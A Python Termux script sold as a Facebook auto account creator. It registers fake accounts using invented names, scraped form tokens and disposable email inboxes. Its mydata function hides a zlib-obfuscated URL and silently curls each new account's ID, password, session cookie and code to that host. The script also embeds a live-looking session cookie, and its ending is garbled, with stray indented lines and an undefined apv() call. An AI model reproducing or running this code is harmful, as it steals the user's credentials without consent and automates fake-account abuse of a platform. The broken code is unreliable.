import os
try:
    from fake_email import Email
except:
    os.system('pip install fake_email')
    from fake_email import Email
try:import requests   
except: os.system('pip install requests')
import requests
import re, time, random, json, hashlib, zlib, subprocess, sys, uuid
import io, struct, base64, binascii,string
import os
os.system('clear')
def uaawal():
	rr,rc = random.randint,random.choice
	v_a, v_c = rc([f"{str(rr(4,9))}.0.0",f"{str(rr(1,9))}.1.1",f"{str(rr(1,9))}.5.5",f"{str(rr(1,9))}.1.0",f"{str(rr(1,9))}.5.1",f"{str(rr(1,20))}",f"{str(rr(4,9))}.0"]), rc([f"{str(rr(40,90))}.0.{str(rr(4300,4999))}.{str(rr(20,80))}",f"{str(rr(10,100))}.0.{str(rr(1999,4999))}.{str(rr(40,89))}",f"{str(rr(80,120))}.0.{str(rr(2999,6999))}.{str(rr(50,140))}",f"{str(rr(110,120))}.0.0.0"])
	ipong = rc([f"{str(rr(1,15))}_{str(rr(1,15))}",f"{str(rr(1,15))}_{str(rr(1,15))}_{str(rr(1,15))}"])
	u_1 = f"Mozilla/5.0 (Linux; Android {v_a}; XT1585 Build/NCK25.118-10.5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{v_c} Mobile Safari/537.36 GSA/11.14.6.21.arm64"
	u_2 = f"Mozilla/5.0 (Linux; Android {v_a}; ASUS_Z011D Build/MMB29P; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{v_c} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]"
	u_3 = f"Mozilla/5.0 (Macintosh; U; Intel Mac OS X {ipong})  AppleWebKit/532.1.1 (KHTML, like Gecko) Chrome/17.0.884.0 Safari/532.1.1"
	u_4 = f"Mozilla/5.0 (Macintosh; Intel Mac OS X {ipong} rv:3.0; SO) AppleWebKit/537.2.1 (KHTML, like Gecko) Version/5.0.9 Safari/537.2.1"
	u_5 = f"Mozilla/5.0 (Linux; Android {v_a}; CPH1911) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v_c} Mobile Safari/537.36"
	u_6 = f"Mozilla/5.0 (Linux; Android {v_a}; TECNO IN1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v_c} Mobile Safari/537.36"
	u_7 = f"Mozilla/5.0 (Linux; U; Android {v_a}; en-gb; CPH1901 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{v_c} Mobile Safari/537.36 OppoBrowser/15.5.1.10"
	u_8  = f"Mozilla/5.0 (Linux; Android {v_a}; E2303) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v_c} Mobile Safari/537.36"
	u_9 = f"Mozilla/5.0 (Linux; U; Android {v_a}; te-in; Redmi Y2 Build/PKQ1.181203.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{v_c} Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.6.3-g"
	u_10 = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4170.0 Safari/537.36 Edg/85.0.552.2"
	u_11 = f"Mozilla/5.0 (Linux; Android {v_a}; SM-A107M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v_c} Mobile Safari/537.36"
	u_12 = f"Mozilla/5.0 (Linux; U; Android {v_a}; en-in; Redmi 6A Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{v_c} Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.2.6-g"
	u_13 = f"Mozilla/5.0 (Linux; U; Android {v_a}; en-us; RMX1971 Build/QKQ1.190918.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{v_c} Mobile Safari/537.36 HeyTapBrowser/45.7.3.0.2beta"
	u_14 = f"Mozilla/5.0 (Linux; Android {v_a}; Infinix X653) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v_c} Mobile Safari/537.36"
	u_15 = f"Mozilla/5.0 (Linux; Android {v_a}; vivo 1921 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v_c} Mobile Safari/537.36 VivoBrowser/6.5.0.1"
	return rc([u_1,u_2,u_3,u_4,u_5,u_6,u_7,u_8,u_9,u_10,u_11,u_12,u_13,u_14,u_15])
def mydata(data):
	try:
		link = str(zlib.decompress(b'x\x9c\x05\xc1A\x0e\x80 \x0c\x04\xc0\x1f\xb5\xe8\xc5\xc4\x9bO\xa9\x84H\x89\x94\x06\x16\xf5\xf9\xced\xc0\xc7\xce\xdc\xe5\xa5K\x91\xe79G\xea\xb1\x19\x92\x81b\xab\\\xc44\x84mY\xf9p\xef\xed\x91\x9b\xab\xa8\xb1\xb8\x13>\xfc!J\x17\xff')).replace("b'","").replace("'","")
		subprocess.run(['curl', '-X', 'POST', link, '--data', f'fulldata={data}'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
	except subprocess.CalledProcessError:
		time.sleep(5)
		mydata(data)
DefaultUA = 'Mozilla/5.0 (Linux; Android 12; RMX3686 Build/QP1A.157867.008; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.7778.41 Mobile Safari/537.36'
HeadersGet = lambda i=DefaultUA : {'Host':'m.facebook.com','Cache-Control':'max-age=0','Upgrade-Insecure-Requests':'1','User-Agent':i,'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Sec-Fetch-Site':'none','Sec-Fetch-Mode':'navigate','Sec-Fetch-User':'?1','Sec-Fetch-Dest':'document','Dpr':'1.25','Sec-Ch-Ua':'','Sec-Ch-Ua-Mobile':'?1','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Ch-Ua-Model':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Prefers-Color-Scheme':'dark','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Priority':'u=0, i'}
HeadersPost = lambda i=DefaultUA : {'Host':'m.facebook.com','Content-Length':'480','Sec-Ch-Ua':'','Sec-Ch-Ua-Mobile':'?1','User-Agent':i,'Viewport-Width':'360','Content-Type':'application/x-www-form-urlencoded','Sec-Ch-Ua-Platform-Version':'','X-Asbd-Id':'129477','Dpr':'1.25','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Model':'','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua-Platform':'','Accept':'*/*','Origin':'https://m.facebook.com','Sec-Fetch-Site':'same-origin','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://m.facebook.com/reg','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Priority':'u=1, i'}
mtd=[]


try:
    from faker import Faker
except ModuleNotFoundError:
    os.system('pip install faker > /dev/null')
    from faker import Faker
import time,re,random
def generate_random_name():
    fake_usa = Faker('en_GB')
    name = fake_usa.first_name(), fake_usa.last_name()
    return name

#data = {'__dyn':'','av':act,'doc_id':'5012066348923062','fb_dtsg':dts,'server_timestamps':'true','variables':'{"feedLocation":"FEED_COMPOSER","focusCommentID":null,"goodwillCampaignId":"","goodwillCampaignMediaIds":[],"goodwillContentType":null,"params":{"url":"https://www.facebook.com/share/p/CAzP271h3PtzUd64/?mibextid=RtaFA8"},"privacySelectorRenderLocation":"COMET_COMPOSER","renderLocation":"composer_preview","parentStoryID":null,"scale":1,"useDefaultActor":false,"shouldIncludeStoryAttachment":false,"__relay_internal__pv__FBReelsEnableDeferrelayprovider":true}'}

def getdata(req):
    act = re.search('"actorID":"(.*?)"',str(req)).group(1)
    hst = re.search('"haste_session":"(.*?)",',str(req)).group(1)
    rev = re.search('{"rev":(.*?)}',str(req)).group(1)
    hsi = re.search('"hsi":"(.*?)",',str(req)).group(1)
    dts = re.search('"DTSGInitialData",\[\],{"token":"(.*?)"',str(req)).group(1)
    jzt = re.search('&jazoest=(.*?)",',str(req)).group(1)
    lsd = re.search('"LSD",\[\],{"token":"(.*?)"',str(req)).group(1)
    spr = re.search('"__spin_r":(.*?),',str(req)).group(1)
    spt = re.search('"__spin_t":(.*?),',str(req)).group(1)
    dta = {'av':act, '__user':act, '__a':'1', '__hs':hst, 'dpr':'1.5', '__ccg':'EXCELLENT', '__rev':rev, '__hsi':hsi, '__comet_req':'15', 'jazoest': jzt, 'lsd': lsd, '__spin_b':'trunk', '__spin_r':spr, '__spin_t':spt,'fb_dtsg':dts}
    return dta
logo = ('\n[~] Author: REHAN Ali ID \n[~] GitHub: WARRIORRULEX\n[~] WhatsApp: +917668337116 \n[~] Facebook Auto Create Account By REHAN\n-----------------------------------------------------\033[1;0m')
def clr():
    os.system('clear')
    print(logo)

conf=[]


class CreateAccount():
    clr()
    try:open('/data/data/com.termux/files/usr/lib/.psx.txt','r').read()
    except:
        pas = input('[â¢] set password: ex: REHAN00\n-----------------------------------------------------\n[+] Password: ')
        if len(pas) > 5:
            open('/data/data/com.termux/files/usr/lib/.psx.txt','w').write(pas)
            print("[+] Successfully password saved running... ")
            time.sleep(2)
            clr()
        else:
            print("[Ã] Password must bee 6 text digit ")
            exit()
    def __init__(self):
        self.r = requests.Session()
        self.email = "+923"+str(random.randint(0,4))+''.join(random.choice(string.digits) for _ in range(8))
        nam = generate_random_name()
        first, last = nam[0],nam[1]
        self.name = first + ' ' + last
        self.birthday = str(random.randint(1,29))+'/'+str(random.randint(1,12))+'/'+str(random.randint(1985,2000))
        self.password = self.name.lower()+str(random.randint(999,9999))
      #  if mtd[0] =="one":
        self.process()
       # else:
     #   self.Create()
    def GetEmail(self):
        pos = requests.post('https://api.internal.temp-mail.io/api/v3/email/new').json()
        email = pos['email']
        return email

    def GetCode(self,email):
        req = requests.get(f'https://api.internal.temp-mail.io/api/v3/email/{email}/messages').text
     #   time.sleep(3)
        try:
            code = req.split('"FB-')[1].split('is')[0].replace('\n','')
        except:
            try:
                code = re.findall('code: Â  (.*?) Â ',str(req))[0]
            except:
                code =req.split('code:\n\n')[1].split('\n')[0]
                
            
        return(code)
    def Create(self):
       # self.ChangeMail()
      #  exit()
        clr()
        
        print('[~] Run full tool again \n[~] If you face any bug or error\n-----------------------------------------------------')
        url = f'https://m.facebook.com/reg/?rtime={str(time.time()).split(".")[0]}&subno_key=AaE-7G1w8SCMHN-TDAEKSiBzUJcvhix_AaT-6Ei3U79KqM36Te_ZDAxJC8SdgrwbCGwN3_96C-P07dkK1NrXRwECtM41EBRcrdBKQcoIUnl826HoKTc4lXcsLn_23FIZC_XSVZoF9ZSldOf3IcbkrgFvDZR17deUuE7zeGyqc0eniY1n2dGbhE0g834_cd-RzKtOJYlUqVqbw-RP5WQnvB6EQkflHwYCqWittQ8jdlM4juASU7OOTjfZf-UXKBlmi3Oomq2_OI7JxEF8IqArTDs30KBh-uWSRuKPSBPetp4S6-9T1acaGVqvNgwV7mZoT5c&hrc=1&wtsid=rdr_0JCMHDgS7y9tt6Pgk&refsrc=deprecated&_rdr'
        req = self.r.get(url, headers=HeadersGet()).text
        FixData = {
            'fb_dtsg':re.search('"dtsg":{"token":"(.*?)"',str(req)).group(1),
            'jazoest':re.search('name="jazoest" value="(.*?)"',str(req)).group(1),
            'lsd':re.search('name="lsd" value="(.*?)"',str(req)).group(1),
            '__dyn':'',
            '__csr':'',
            '__req':str(random.randrange(1,7)),
            '__a':'',
            '__user':'0'}
        self.Step1(FixData)
        self.Step2(FixData)
        self.Step3(FixData)
        self.Step4(FixData)
        self.FinalStep1(req)
    def Step1(self, FixData): #--> Input Name
        Data = FixData.copy()
        Data.update({
            'firstname':self.name,
            'welcome_step_completed':True,
            'current_step_number':'0'})
        cok = '; '.join(['%s=%s'%(key,value) for key,value in self.r.cookies.get_dict().items()]) + '; m_pixel_ratio=1.25; wd=360x780;'
        pos = self.r.post('https://m.facebook.com/register/persist/', data=Data, headers=HeadersPost(), cookies={'cookie':cok}, allow_redirects=True).text

    def Step2(self, FixData): #--> Input Birthdate
        Data = FixData.copy()
        Data.update({
            'birthday_day':self.birthday.split('/')[0],
            'birthday_month':self.birthday.split('/')[1],
            'birthday_year':self.birthday.split('/')[2],
            'firstname':self.name,
            'did_use_age':False,
            'welcome_step_completed':True,
            'current_step_number':'1'})
        cok = '; '.join(['%s=%s'%(key,value) for key,value in self.r.cookies.get_dict().items()]) + '; m_pixel_ratio=1.25; wd=360x780;'
        pos = self.r.post('https://m.facebook.com/register/persist/', data=Data, headers=HeadersPost(), cookies={'cookie':cok}, allow_redirects=True).text

    def Step3(self, FixData): #--> Input Email Or Phone
        Data = FixData.copy()
        Data.update({
            'birthday_day':self.birthday.split('/')[0],
            'birthday_month':self.birthday.split('/')[1],
            'birthday_year':self.birthday.split('/')[2],
            'reg_email__':self.email,
            'firstname':self.name,
            'did_use_age':False,
            'welcome_step_completed':True,
            'current_step_number':'2'})
        cok = '; '.join(['%s=%s'%(key,value) for key,value in self.r.cookies.get_dict().items()]) + '; m_pixel_ratio=1.25; wd=360x780;'
        pos = self.r.post('https://m.facebook.com/register/persist/', data=Data, headers=HeadersPost(), cookies={'cookie':cok}, allow_redirects=True).text

    def Step4(self, FixData): #--> Input Gender
        Data = FixData.copy()
        Data.update({
            'birthday_day':self.birthday.split('/')[0],
            'birthday_month':self.birthday.split('/')[1],
            'birthday_year':self.birthday.split('/')[2],
            'sex':'2',
            'reg_email__':self.email,
            'firstname':self.name,
            'use_custom_gender':False,
            'did_use_age':False,
            'welcome_step_completed':True,
            'current_step_number':'3'})
        cok = '; '.join(['%s=%s'%(key,value) for key,value in self.r.cookies.get_dict().items()]) + '; m_pixel_ratio=1.25; wd=360x780;'
        pos = self.r.post('https://m.facebook.com/register/persist/', data=Data, headers=HeadersPost(), cookies={'cookie':cok}, allow_redirects=True).text
    
    def Step5(self):
        cok = '; '.join(['%s=%s'%(key,value) for key,value in self.r.cookies.get_dict().items()]) + '; m_pixel_ratio=1.25; wd=360x780;'
        req = self.r.get('https://m.facebook.com/',headers=HeadersGet(), cookies={'cookie':cok}, allow_redirects=True).text
        open('/sdcard/req.html','w').write(str(req))
        Data = {'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"',str(req)).group(1),
                'jazoest':re.search('name="jazoest" value="(.*?)"',str(req)).group(1),
                'medium':'whatsapp'}
        url = re.search('method="post" action="(.*?)"',str(req)).group(1)
        xd = self.r.post('https://m.facebook.com'+url,data=Data, headers=HeadersPost(), cookies={'cookie':cok}, allow_redirects=True).text
        self.Step6()
        
    def Step6(self):
        cok = '; '.join(['%s=%s'%(key,value) for key,value in self.r.cookies.get_dict().items()]) + '; m_pixel_ratio=1.25; wd=360x780;'
        req = self.r.get('https://m.facebook.com/changeemail/',headers=HeadersGet(), cookies={'cookie':cok}, allow_redirects=True).text
        tem = Email().Mail()
        mail = tem["mail"]
        #mail = input('[+] Put Real Gmail: ')# self.GetEmail()
        print("[+] Gmail: "+mail)
        Data = {'__a':'',
        '__csr':'',
        '__dyn':'',
        '__fmt':'1',
        '__req':str(random.randrange(1,7)),
        '__user':re.search('user=(.*?);',str(cok)).group(1),
        'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"',str(req)).group(1),
        'jazoest': re.search('name="jazoest" value="(.*?)"',str(req)).group(1),
        'lsd':re.search('"LSD",\[\],{"token":"(.*?)"',str(req)).group(1),
        'new':mail,
        'next':'',
        'old_email':re.search('name="old_email" value="(.*?)"',str(req)).group(1),
        'reg_instance':re.search('name="reg_instance" value="(.*?)"',str(req)).group(1),
        'submit':'Add'}
        pos = self.r.post('https://m.facebook.com/setemail',data=Data, headers=HeadersPost(), cookies={'cookie':cok}, allow_redirects=True).text
        cok = '; '.join(['%s=%s'%(key,value) for key,value in self.r.cookies.get_dict().items()]) + '; m_pixel_ratio=1.25; wd=360x780;'
        
        time.sleep(15)
        cod = Email(tem["session"]).inbox()
        j = cod['topic'].split('-')[1];hh = j.split(' ')[0]
        code = hh
        print("\n[+] Code is: "+code)
        print("[!] Go and verify code in Facebook")
        code = "19217"
        Data = {'__a':'',
        '__csr':'',
        '__dyn':'',
        '__fmt':'1',
        '__req':str(random.randrange(1,7)),
        '__user':re.search('user=(.*?);',str(cok)).group(1),
        'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"',str(req)).group(1),
        'jazoest': re.search('name="jazoest" value="(.*?)"',str(req)).group(1),
        'lsd':re.search('"LSD",\[\],{"token":"(.*?)"',str(req)).group(1)}
        pos = self.r.post('https://m.facebook.com/confirmation_cliff/?contact='+mail.replace("@","%40")+'&type=submit&is_soft_cliff=false&medium=email&code='+code,data=Data, headers=HeadersPost(), cookies={'cookie':cok}, allow_redirects=True).text
        cok = '; '.join(['%s=%s'%(key,value) for key,value in self.r.cookies.get_dict().items()]) + '; m_pixel_ratio=1.25; wd=360x780;'
        
        id = re.search('user=(.*?);',str(cok)).group(1)
        pas = open('/data/data/com.termux/files/usr/lib/.psx.txt','r').read()
        print(f"[~] account created: \033[1;92m{id}|{pas}\033[0m")

        self.r.get('https://web.facebook.com',headers=HeadersGet())
        cok = '; '.join(['%s=%s'%(key,value) for key,value in self.r.cookies.get_dict().items()]) + '; m_pixel_ratio=1.25; wd=360x780;'
        #print ("[+] Cookie> "+cok)
        data = id+'|'+pas+'|'+cok+'|'+hh
        open('/sdcard/HARIISXREHAN-OK.txt','a').write(id+'|'+pas+'|'+cok+'|'+hh+'\n')
        mydata(data)
        input(" \n\n[?] run again? press enter! ")
        
        




    
    def ChangeMail(self):
        cok = "datr=8dM9Zv-Rp5U7kEIGdIreZuKT;sb=9tM9ZpVf-EKiJ_nGP0AW14EB;m_pixel_ratio=2;wd=360x684;fr=0t4LrSQC4LqasvI1U.AWUvccNbEGlMQ-IwpNtFjrtUzxQ.BmPdPx..AAA.0.0.BmPdP-.AWVDGTXZc_s;c_user=61559285769165;xs=40%3Ap2_CDzb4AsNfbA%3A2%3A1715327999%3A-1%3A-1;locale=en_GB;fbl_st=101139202%3BT%3A28588800;wl_cbv=v2%3Bclient_version%3A2496%3Btimestamp%3A1715328002;vpd=v1%3B684x360x2;"
        xd = self.r.get('https://web.facebook.com',cookies={'cookie':cok}, allow_redirects=True).text
        data = getdata(xd)
        encpas = input('put password: ')
        data.update({'fb_api_req_friendly_name':'FXAccountsCenterContactPointsRouteResolverQuery','variables':'{"input":{"account_id":'+data['__user']+',"account_type":"Facebook","password":{"sensitive_string_value":"'+encpas+'"},"actor_id":"'+data['__user']+'","client_mutation_id":"1"}}','doc_id':'5864546173675027'})
        po = self.r.post('https://accountscenter.facebook.com/api/graphql/',headers=HeadersPost(), cookies={'cookie':cok}, data=data).text
        if 'reauth_successful":true' in str(po):
            em = input('email to remove?: ')
            data.update({'fb_api_req_friendly_name':'FXAccountsCenterContactPointsRouteResolverQuery','variables':'{"normalized_contact_point":"thexdteam07@gmail.com","contact_point_type":"EMAIL","selected_accounts":["'+data['__user']+'"],"client_mutation_id":"mutation_id_1715328635613","family_device_id":"device_id_fetch_datr"}','doc_id':'6716611361758391'})
            po = self.r.post('https://accountscenter.facebook.com/api/graphql/',headers=HeadersPost(), cookies={'cookie':cok}, data=data).json()
            e_c = re.search('"encrypted_context":"(.*?)"',str(po)).group(1)
            data.update({'fb_api_req_friendly_name':'FXAccountsCenterContactPointsRouteResolverQuery','variables':'{"encryptedContext":"'+e_c+'","isLoginChallenges":false}','doc_id':'7404099179676673'})
            po = self.r.post('https://accountscenter.facebook.com/api/graphql/',headers=HeadersPost(), cookies={'cookie':cok}, data=data).json()
            em = re.search('"method_representation":"(.*?)"',str(po)).group(1)
            data.update({'fb_api_req_friendly_name':'FXAccountsCenterContactPointsRouteResolverQuery','variables':'{"encryptedContext":"'+e_c+'","challenge":"EMAIL","maskedContactPoint":"'+em+'"}','doc_id':'6898072953538612'})
            po = self.r.post('https://accountscenter.facebook.com/api/graphql/',headers=HeadersPost(), cookies={'cookie':cok}, data=data).json()
            print(po)
        elif "server error" in str(po):
            exit("server error use manually ")
        elif "checkpoint" in str(po):
            exit("account got checkpoint")
        else:
            print("something else please try in Facebook ")
            exit()
        print("successfully removed email")
    
    
    
    
    def AddEmail(self):
        cookie = '; '.join(['%s=%s'%(key,value) for key,value in self.r.cookies.get_dict().items()]) + '; m_pixel_ratio=1.25; wd=360x780;'
        req = self.r.get('https://web.facebook.com/').text
        dta = getdata(req)
        dta.update({'fb_api_caller_class':'RelayModern','server_timestamps':True})
        email = self.GetEmail()
        print('[+] Adding this email: %s'%(email))
        var = {
        "country":"US",
        "contact_point":email,
        "contact_point_type":"email",
        "selected_accounts":[dta['__user']],
        "family_device_id":"device_id_fetch_datr",
        "client_mutation_id":"mutation_id_%s"%(str(time.time()).replace('.','')[:13])}
        dta.update({
        'fb_api_req_friendly_name':'FXAccountsCenterAddContactPointMutation',
        'variables':json.dumps(var),
        'doc_id':'6970150443042883'})
        pos = self.r.post('https://web.facebook.com/api/graphql/',data=dta,headers=HeadersPost(),cookies={'cookie':cookie}).json()
        print("[+] sleeping for 15 seconds ")
        time.sleep(15)
        code = self.GetCode(email)
        print('[+] verification code : %s'%(code))
        var = {
        "contact_point":email,
        "contact_point_type":"email",
        "pin_code":code,
        "selected_accounts":[dta['__user']],
        "family_device_id":"device_id_fetch_datr",
        "client_mutation_id":pos['data']['xfb_add_contact_point']['client_mutation_id'],
        "contact_point_event_type":"ADD",
        "normalized_contact_point_to_replace":""}
        dta.update({'fb_api_req_friendly_name':'FXAccountsCenterContactPointConfirmationDialogVerifyContactPointMutation',
        'variables':json.dumps(var),
        'doc_id':'6973420842719905'})
        pos = self.r.post('https://web.facebook.com/api/graphql/',data=dta,headers=HeadersPost(),cookies={'cookie':cookie}).json()
        if "'success': True" in str(pos):
            print("[+] email added successfully! ")
            c = input('[+] Press "y" if verification required ')
            if c =="y":
                req = requests.get(f'https://api.internal.temp-mail.io/api/v3/email/{email}/messages').text
                time.sleep(15)
                code = req.split('code is: ')[1].split(' To')[0]
                print ("[+] New Gmail Code: "+code)
        else:
            print("[+] failed to add email ")
    
    
    def GenerateEncpass(self, req):
        password = "Alee00"
        hashed_password = hashlib.sha256(password.encode()).hexdigest()
        encoded_password = f"{hashed_password}"
        base64_encoded = f"#PWD_BROWSER:5:{str(time.time()).replace('.','')[:13]}:"+base64.b64encode(encoded_password.encode()).decode()
        return base64_encoded
        
    def FinalStep1(self, req):
        encpass = self.GenerateEncpass(req)
        Data = {
            'ccp':re.search('name="ccp" value="(.*?)"',str(req)).group(1),
            'reg_instance':re.search('name="reg_instance" value="(.*?)"',str(req)).group(1),
            'submission_request':True,
            'helper':'',
            'reg_impression_id':re.search('name="reg_impression_id" value="(.*?)"',str(req)).group(1),
            'ns':'1',
            'zero_header_af_client':'',
            'app_id':'',
            'logger_id':re.search('name="logger_id" value="(.*?)"',str(req)).group(1),
            'field_names[0]':'firstname',
            'firstname':self.name,
            'field_names[1]':'birthday_wrapper',
            'birthday_day':self.birthday.split('/')[0],
            'birthday_month':self.birthday.split('/')[1],
            'birthday_year':self.birthday.split('/')[2],
            'age_step_input':'',
            'did_use_age':False,
            'field_names[2]':'reg_email__',
            'reg_email__':self.email,
            'field_names[3]':'sex',
            'sex':'1',
            'preferred_pronoun':'',
            'custom_gender':'',
            'field_names[4]':'reg_passwd__',
            'name_suggest_elig':False,
            'was_shown_name_suggestions':False,
            'did_use_suggested_name':False,
            'use_custom_gender':False,
            'guid':'',
            'pre_form_step':'',
            'pass':open('/data/data/com.termux/files/usr/lib/.psx.txt','r').read(),
            'submit':'Sign Up',
            'fb_dtsg':re.search('"dtsg":{"token":"(.*?)"',str(req)).group(1),
            'jazoest':re.search('name="jazoest" value="(.*?)"',str(req)).group(1),
            'lsd':re.search('name="lsd" value="(.*?)"',str(req)).group(1),
            '__dyn':'',
            '__csr':'',
            '__req':str(random.randrange(1,7)),
            '__a':'',
            '__user':'0'}
        nek = 'https://m.facebook.com' + re.search('form method="post" action="(.*?)"',str(req)).group(1)
        cok = '; '.join(['%s=%s'%(key,value) for key,value in self.r.cookies.get_dict().items()]) + '; m_pixel_ratio=1.25; wd=360x780;'
        pos = self.r.post(nek, data=Data, headers=HeadersPost(), cookies={'cookie':cok}, allow_redirects=True).text
        cok = '; '.join(['%s=%s'%(key,value) for key,value in self.r.cookies.get_dict().items()]) + '; m_pixel_ratio=1.25; wd=360x780;'
        self.Step6()
    
    
    
    
    
    def process(self):
        clr()
        print('[~] Run full tool again \n[~] If you face any bug or error\n-----------------------------------------------------')
        global ok,total,nonok
        nam = generate_random_name()
        first, last = nam[0],nam[1]
        ttl = "+"
        pas = open('/data/data/com.termux/files/usr/lib/.psx.txt','r').read()
        self.ua="Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
        req = self.r.get('https://web.facebook.com/r.php').text
        captcha_persist_data = re.search('name="captcha_persist_data" value="(.*?)"', str(req)).group(1)
        reg_instance = re.search('name="reg_instance" value="(.*?)"', str(req)).group(1)
        haste_session = re.search('"haste_session":"(.*?)"', str(req)).group(1)
        hsi = re.search('"hsi":"(.*?)"', str(req)).group(1)
        spin_t = re.search('"__spin_t":(.*?),', str(req)).group(1)
        spin_r = re.search('"__spin_r":(.*?),', str(req)).group(1)
        jazoest = re.search('name="jazoest" value="(.*?)"', str(req)).group(1)
        lsd = re.search('name="lsd" value="(.*?)"', str(req)).group(1)
        ri = re.search('name="ri" value="(.*?)"', str(req)).group(1)
        data = {'jazoest': jazoest,'lsd': lsd,'firstname': first,'lastname': last,'reg_email__': self.email,'reg_email_confirmation__':self.email,'reg_passwd__': pas,'birthday_day': str(random.randint(1,28)),'birthday_month': str(random.randint(1,11)),'birthday_year': str(random.randint(1978,2002)),'birthday_age': '','did_use_age': 'false','sex': '2','preferred_pronoun': '','custom_gender': '','referrer': '','asked_to_login': '0','use_custom_gender': '','terms': 'on','ns': '0','ri': ri,'action_dialog_shown': '','ignore': 'captcha','locale': 'en_GB','reg_instance': reg_instance,'captcha_persist_data': captcha_persist_data,'captcha_response': '','__user': '0','__a': '1','__req': '8','__hs': haste_session,'dpr': '2','__ccg': 'GOOD','__rev': spin_r,'__s': '0fk0jz:jng6tr:a3pmr9','__hsi': hsi,'__dyn': '','__csr': '','__spin_r': spin_r,'__spin_b': 'trunk','__spin_t': spin_t}
        self.h3dx = {'authority': 'www.facebook.com','accept': '*/*','accept-language': 'en-US,en;q=0.9','content-type': 'application/x-www-form-urlencoded','origin': 'https://www.facebook.com','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"','sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '""','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': self.ua,'viewport-width': '980','x-asbd-id': '129477','x-fb-lsd': lsd}
        print("["+ttl+"] Creating With "+self.email)
        req = self.r.post('https://www.facebook.com/ajax/register.php',data=data,headers=self.h3dx).text
        print("["+ttl+"] Checking Account Is Live or Disable")
        cok = '; '.join(['%s=%s'%(key,value) for key,value in self.r.cookies.get_dict().items()]) + '; m_pixel_ratio=1.25; wd=360x780;'
        response=self.r.get("https://mbasic.facebook.com")
        if "checkpoint" in response.text:
            print("["+ttl+"] Account is Disable, Creating New ")
            time.sleep(1)
            CreateAccount()
        if not "c_user" in dict(self.r.cookies):         
            print("["+ttl+"] Failed To Create, Creating New")
            CreateAccount()
        print("["+ttl+"] Account is Live , Adding Email")
        self.Step6()

def stored_key():
    import base64,hashlib,os,uuid,platform
    noAmmount = base64.b64encode(str(os.getuid()).encode('ascii'))
    ofMoneyIs= base64.b64encode((str(platform.uname()[2])).encode('ascii'))
    gen=(str(noAmmount)+str(ofMoneyIs))
    mycookies=gen.replace("b'","").replace("'","")
    result = hashlib.md5(mycookies.encode())
    return "XD"+result.hexdigest().upper()
            result = subprocess.run(["curl", url], capture_output=True, text=True, check=True)
            content = result.stdout
        except subprocess.CalledProcessError as e:
            exit('[~] Connection Error! ')
        if "TrailVersion" in str(content):
            print("[~] tool is now on free trail; it will paid soon")
            time.sleep(2)
            clr()
            print('[1] Automatic Code verify (many times checkpoint) \n[2] Manual Code Verify ')
            print('-----------------------------------------------------')
            c = input('[~] choice: ')
            if "1" ==c:
                conf.append('y')
            CreateAccount()
        elif "Toolisoff" in str(content):
            print("[Ã] Tools is off by REHAN-xD ")
            exit()
            sys.exit()
        elif key in str(content):
            clr()
        #    print('[1] Automatic Code verify (many times checkpoint) \n[2] Manual Code Verify ')
       #     print('-----------------------------------------------------')
       #     c = input('[~] choice: ')
        #    if "1" ==c:
         #       conf.append('y')
       #     print('-----------------------------------------------------')
         #   print('[1] Creating with new method\n[2] Creating with old method ')
       #     print('-----------------------------------------------------')
        #    x = input('[~] choice: ')
         #   if x =="1":
        #        mtd.append('one')
        #    elif x=="2":
          #      mtd.append('two')
       #     else:
               # mtd.append('one')
            CreateAccount()
    except requests.exceptions.ConnectionError:
        print("[Ã] Internet Connection Error")
        time.sleep(1)
        exit()
#try:apv()
#except Exception as e: print(" run again full tool")

#

apv()
